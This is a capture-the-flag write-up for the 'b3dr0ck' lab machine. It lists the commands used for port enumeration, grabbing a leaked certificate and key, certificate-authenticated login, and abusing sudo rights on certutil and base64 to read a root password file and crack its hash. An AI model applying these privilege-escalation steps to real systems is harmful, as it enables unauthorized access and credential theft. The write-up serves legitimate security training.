# b3dr0ck

**Difficulty:** Medium
**Category:** Enumeration / Certificate Authentication / Privilege Escalation

# Summary

b3dr0ck is a Linux machine based around certificate authentication and sudo misconfigurations. The attack involved obtaining certificates for barney and fred, using them to retrieve their SSH passwords, and finally abusing base64 to obtain the root password.


# Enumeration
```bash
nmap -sCV -v -p- <MACHINE_IP>
```

The interesting ports were 9009 and 54321.

# Initial Access

Port 9009 revealed Barney's certificate and private key:

```bash
nc -v <MACHINE_IP> 9009
```

The files were saved as barney.crt and barney.key:

```bash
chmod 600 barney.key
```


They were then used to connect to the SSL service:

```bash
openssl s_client -connect <MACHINE_IP>:54321 -cert barney.crt -key barney.key
```

Using the hint, Barney's password was obtained and used for SSH:

```bash
ssh barney@<MACHINE_IP>
```

The user flag was obtained from Barney's home directory.

# Lateral Movement

Checking sudo permissions revealed that certutil could be executed as root:
```bash
sudo -l
sudo certutil -a fred.csr.pem
```

Fred's certificate and key were obtained and used in the same way:
```bash
chmod 600 fred.key
openssl s_client -connect <MACHINE_IP>:54321 -cert fred.crt -key fred.key
```

The hint revealed Fred's password, allowing SSH access:
```bash
ssh fred@<MACHINE_IP>
```
# Privilege Escalation

Fred could execute base64 as root:
```bash
sudo -l
sudo /usr/bin/base64 /root/pass.txt
```

The output was decoded through multiple encoding layers and the resulting hash was cracked using CrackStation.

The recovered password was used to become root:
```bash
su root
/root/root.txt
```
